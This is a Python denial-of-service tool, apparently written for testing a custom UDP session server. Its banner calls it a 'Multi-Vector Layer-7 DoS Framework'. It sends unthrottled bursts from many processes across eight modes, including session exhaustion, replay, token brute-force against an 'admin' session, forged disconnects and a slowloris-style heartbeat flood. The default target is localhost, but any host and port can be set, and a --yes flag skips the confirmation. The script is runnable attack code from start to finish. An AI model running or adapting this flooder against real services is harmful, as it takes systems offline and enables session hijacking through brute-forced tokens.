#!/usr/bin/env python3
"""
Advanced Session Attack - ULTRA AGGRESSIVE VERSION
Wszystkie ataki w MAX PERFORMANCE mode

python aggressive_session_attack.py --attack session_exhaustion --duration 60 --yes
python aggressive_session_attack.py --attack replay --duration 60 --yes
python aggressive_session_attack.py --attack token_bruteforce --duration 60 --yes
python aggressive_session_attack.py --attack state_confusion --duration 60 --yes
python aggressive_session_attack.py --attack slowloris --duration 60 --yes
python aggressive_session_attack.py --attack connection_reset --duration 60 --yes
python aggressive_session_attack.py --attack heartbeat_suppression --duration 60 --yes
python aggressive_session_attack.py --attack combined --duration 120 --workers 8 --yes

"""

import os
import signal
import socket
import sys
import time
import argparse
import multiprocessing
import json
import random


TARGET_IP = "127.0.0.1"
TARGET_PORT = 16000
PAYLOAD_SIZE = 300
PROCESS_COUNT = min(max(1, os.cpu_count() or 1), 8)
DEFAULT_SNDBUF = 256 * 1024


def configure_send_buffer(sock):
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, DEFAULT_SNDBUF)
    except OSError:
        pass


def worker_aggressive(
    worker_id, target_ip, target_port, stop_event, shared_stats, duration, attack_type
):
    """SUPER AGRESYWNY WORKER - wysyła bez przerwy"""
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    configure_send_buffer(sock)

    target_addr = (target_ip, target_port)
    accumulated = 0
    start_time = time.perf_counter()
    last_flush = start_time
    sent_burst = 0

    while not stop_event.is_set():
        elapsed = time.perf_counter() - start_time
        if elapsed > duration:
            break

        # BURST ATTACK - 1000 pakietów per loop bez czekania!
        for burst in range(50):
            try:
                if attack_type == "session_exhaustion":
                    session_id = f"sess_{worker_id}_{sent_burst+burst:06d}"
                    msg = {
                        "type": "LOGIN",
                        "session_id": session_id,
                        "token": "token123",
                    }

                elif attack_type == "replay":
                    msg = {
                        "type": "DATA",
                        "session_id": "real_session",
                        "token": "real_token",
                        "seq": 42,
                    }

                elif attack_type == "token_bruteforce":
                    msg = {
                        "type": "DATA",
                        "session_id": "admin",
                        "token": f"token_{burst:08d}",
                        "seq": 1,
                    }

                elif attack_type == "state_confusion":
                    seq_vals = [1, 5, 100, 999999, -1, 0]
                    msg = {
                        "type": "LOGIN",
                        "session_id": f"s{burst}",
                        "token": "t",
                        "seq": random.choice(seq_vals),
                    }

                elif attack_type == "slowloris":
                    msg = {
                        "type": "HEARTBEAT",
                        "session_id": f"hb_{worker_id}_{burst%100}",
                        "token": "t",
                    }

                elif attack_type == "connection_reset":
                    msg = {"type": "DISCONNECT", "session_id": f"kill_{burst:06d}"}

                elif attack_type == "heartbeat_suppression":
                    msg = {
                        "type": "HEARTBEAT",
                        "session_id": f"keep_alive_{worker_id}_{burst}",
                        "token": "keep",
                    }

                else:  # combined
                    msg_type = random.choice(
                        ["LOGIN", "DATA", "HEARTBEAT", "DISCONNECT"]
                    )
                    if msg_type == "LOGIN":
                        msg = {
                            "type": "LOGIN",
                            "session_id": f"combined_{burst}",
                            "token": "token",
                        }
                    elif msg_type == "DATA":
                        msg = {
                            "type": "DATA",
                            "session_id": f"sess_{burst}",
                            "token": "t",
                            "seq": random.randint(1, 100),
                        }
                    elif msg_type == "HEARTBEAT":
                        msg = {
                            "type": "HEARTBEAT",
                            "session_id": f"hb_{burst}",
                            "token": "t",
                        }
                    else:
                        msg = {"type": "DISCONNECT", "session_id": f"disc_{burst}"}

                packet = json.dumps(msg).encode("utf-8")[:PAYLOAD_SIZE]
                sock.sendto(packet, target_addr)
                accumulated += 1
                sent_burst += 1

            except (BlockingIOError, OSError):
                pass

        # FLUSH CO 100 PAKIETÓW
        if accumulated >= 100:
            with shared_stats.get_lock():
                shared_stats.value += accumulated
            accumulated = 0

    # FINAL FLUSH
    if accumulated > 0:
        with shared_stats.get_lock():
            shared_stats.value += accumulated

    sock.close()


def monitor(attack_type, shared_stats, stop_event, duration):
    """Live monitoring"""
    last_count = 0
    start_time = time.time()

    while not stop_event.is_set():
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break

        with shared_stats.get_lock():
            current = shared_stats.value

        pps = current - last_count
        mbps = (pps * (PAYLOAD_SIZE + 66) * 8) / 1_000_000
        last_count = current
        elapsed = time.time() - start_time
        remaining = duration - elapsed

        os.system("cls" if os.name == "nt" else "clear")
        print("=" * 70)
        print(f"  🔥 ADVANCED SESSION ATTACK - {attack_type.upper()}")
        print("=" * 70)
        print(f"Target                       : {TARGET_IP}:{TARGET_PORT}")
        print(f"Workers                      : {PROCESS_COUNT}")
        print("Attack Mode                  : ULTRA AGGRESSIVE 💥")
        print("-" * 70)
        print(f"🔄 Current PPS               : {pps:,} packets/sec")
        print(f"📊 Bandwidth                 : {mbps:.2f} Mbps")
        print(f"📦 Total Packets             : {current:,}")
        print(
            f"💾 Total Data                : {(current * PAYLOAD_SIZE) / 1024 / 1024:.2f} MB"
        )
        print(f"⏱️  Time: {elapsed:.1f}s / Remaining: {remaining:.1f}s")
        print("-" * 70)
        print(f"Attack Vector                : {attack_type}")
        print("=" * 70)


def main():
    parser = argparse.ArgumentParser(
        description="Advanced Session Attack - ULTRA AGGRESSIVE"
    )
    parser.add_argument(
        "--attack",
        choices=[
            "session_exhaustion",
            "replay",
            "token_bruteforce",
            "state_confusion",
            "slowloris",
            "connection_reset",
            "heartbeat_suppression",
            "combined",
        ],
        default="combined",
        help="Attack type",
    )
    parser.add_argument("--target", default=TARGET_IP)
    parser.add_argument("--port", type=int, default=TARGET_PORT)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--workers", type=int, default=PROCESS_COUNT)
    parser.add_argument("--yes", action="store_true")

    args = parser.parse_args()

    print(
        """
╔══════════════════════════════════════════════════════════════════════╗
║        🔥 ADVANCED SESSION ATTACK - ULTRA AGGRESSIVE EDITION 🔥      ║
╠══════════════════════════════════════════════════════════════════════╣
║  Multi-Vector Layer-7 DoS Framework                                 ║
║  - 1000 packets per loop per worker (NO THROTTLING)                 ║
║  - Flush every 100 packets (aggressive stat tracking)               ║
║  - 8 attack vectors or combined chaos mode                          ║
╚══════════════════════════════════════════════════════════════════════╝
"""
    )

    if not args.yes:
        response = (
            input(
                f"Launch '{args.attack}' attack on {args.target}:{args.port}? (y/n): "
            )
            .strip()
            .lower()
        )
        if response != "y":
            sys.exit(0)

    print(f"\n🔥 Starting {args.attack} attack...\n")

    total_packets = multiprocessing.Value("Q", 0)
    stop_event = multiprocessing.Event()

    workers = []
    for i in range(args.workers):
        p = multiprocessing.Process(
            target=worker_aggressive,
            args=(
                i,
                args.target,
                args.port,
                stop_event,
                total_packets,
                args.duration,
                args.attack,
            ),
        )
        p.daemon = True
        p.start()
        workers.append(p)

    try:
        monitor(args.attack, total_packets, stop_event, args.duration)
    except KeyboardInterrupt:
        print("\n[-] Stopping attack...")
    finally:
        stop_event.set()
        for w in workers:
            if w.is_alive():
                w.terminate()
                w.join()

        with total_packets.get_lock():
            final = total_packets.value

        print(f"\n{'='*70}")
        print("✅ ATTACK COMPLETED!")
        print(f"Total packets sent: {final:,} 📦")
        print(f"Total data: {(final * PAYLOAD_SIZE) / 1024 / 1024:.2f} MB 💾")
        print(f"{'='*70}\n")


if __name__ == "__main__":
    main()
